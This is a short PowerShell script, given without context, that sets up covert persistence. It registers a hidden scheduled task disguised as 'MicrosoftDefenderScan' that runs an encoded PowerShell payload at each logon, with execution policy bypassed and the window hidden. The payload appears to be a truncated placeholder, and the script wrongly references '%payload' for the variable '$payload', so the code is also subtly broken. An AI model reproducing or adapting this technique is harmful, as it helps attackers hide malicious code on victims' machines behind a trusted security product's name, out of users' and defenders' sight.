$payload = "d2VudHN0dWR5aW5ncGxhbm1hcmtldGZsb2F0aW5nYWxvbmdmYWxsZW5saXR0bGVwZWE=..."

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand %payload"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -TaskName "MicrosoftDefenderScan" -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -Force
